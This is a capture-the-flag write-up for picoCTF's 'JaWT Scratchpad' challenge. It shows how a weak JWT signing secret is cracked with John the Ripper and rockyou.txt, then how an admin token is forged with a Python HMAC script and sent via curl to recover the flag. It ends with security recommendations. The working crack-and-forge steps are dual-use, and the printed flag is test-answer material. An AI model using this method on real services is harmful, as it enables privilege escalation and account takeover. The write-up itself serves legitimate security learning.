# Writeup: JaWT Scratchpad Challenge

**Challenge:** JaWT Scratchpad  
**Author:** John Hammond  
**Description:** Check the admin scratchpad!  
**URL:** http://fickle-tempest.picoctf.net:52520  

## Initial Reconnaissance

Upon visiting the challenge URL, the following information was displayed:
```
(You will need to log in to access the JaWT scratchpad. You can use any name, other than admin... because the admin user gets a special scratchpad!)
```

Key observations:
1. The application requires authentication to access the scratchpad
2. Any username except `admin` is allowed for registration/login
3. The `admin` user has a special scratchpad (likely containing the flag)
4. The challenge title "JaWT" hints at JWT (JSON Web Token) implementation
5. Page source contained a reference to https://www.jwt.io/, confirming JWT usage

## Enumeration

### 1. Initial Account Creation
Created an account with username `obito`:
```bash
# Manual registration through web interface
Username: obito
```

### 2. Authentication Flow Analysis
Upon successful login, Burp Suite intercepted the HTTP request containing the authentication token:
```
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoib2JpdG8ifQ.9_I1KLvR2rgmkxub_mjw6v0rZBT15GyGe5cyMHmfop4
```

### 3. JWT Token Decoding
Decoded the JWT token using CyberChef or command-line tools:

**Header:**
```bash
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
{"typ":"JWT","alg":"HS256"}
```

**Payload:**
```bash
echo "eyJ1c2VyIjoib2JpdG8ifQ" | base64 -d
{"user":"obito"}
```

**Signature:** `9_I1KLvR2rgmkxub_mjw6v0rZBT15GyGe5cyMHmfop4`

Analysis confirmed:
- The JWT uses HS256 algorithm
- Payload contains `{"user":"obito"}`
- Need to modify to `{"user":"admin"}` for admin access

## Attack Vector

The vulnerability is **JWT token tampering** with **weak secret key**.

### 4. Secret Key Cracking
Attempted to crack the JWT signature to obtain the secret key:

```bash
# Save JWT token to file
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoib2JpdG8ifQ.9_I1KLvR2rgmkxub_mjw6v0rZBT15GyGe5cyMHmfop4" > jwt.txt

# Crack using John The Ripper with rockyou.txt wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# Output:
# ilovepico        (?)
```

**Secret key discovered:** `ilovepico`

### 5. Forged Admin JWT Creation
Created a Python script to generate a valid JWT for `admin` user:

```python
import hmac
import hashlib
import base64

# Header (same as original)
header = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"

# Modified payload with admin user
payload = "eyJ1c2VyIjoiYWRtaW4ifQ"

# Data to sign
data = f"{header}.{payload}"
data_bytes = data.encode('utf-8')

# Secret key obtained from cracking
secret = b"ilovepico"

# Create HMAC-SHA256 signature
signature = hmac.new(secret, data_bytes, hashlib.sha256).digest()

# Base64URL encode
signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

print(f"JWT: {header}.{payload}.{signature_b64}")
```

**Generated admin JWT:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

### 6. Admin Access Attempt
Replaced the original JWT cookie with the forged admin JWT:

```bash
# Using curl to test admin access
curl -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s" \
http://fickle-tempest.picoctf.net:52520/
```

**Alternative approach via Burp Suite:**
1. Intercepted authenticated request
2. Modified JWT cookie value to forged admin token
3. Forwarded request to server

## Flag Acquisition

After successfully authenticating with the forged admin JWT, the response contained:

```
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
```

**Final Flag:** `picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}`

## Technical Summary

**Vulnerability:** Insecure JWT implementation with weak secret key
**Impact:** Privilege escalation from regular user to admin
**Root Cause:** 
1. Use of weak secret key (`ilovepico`) for JWT signing
2. Lack of proper signature validation mechanism
3. Reliance on client-controlled JWT payload for authorization decisions

**Security Recommendations:**
1. Use strong, randomly generated secret keys
2. Implement proper token validation with signature verification
3. Avoid using user-controlled claims for authorization decisions
4. Consider using asymmetric cryptography (RS256) instead of symmetric (HS256)

## Tools Used
- Web browser for initial access
- Burp Suite for HTTP interception and manipulation
- John The Ripper for secret key cracking
- Python for JWT token generation
- Base64 decoding tools for token analysis

This challenge demonstrated the importance of secure JWT implementation and the risks of using weak cryptographic keys in authentication systems.
                                                                                                                                                  
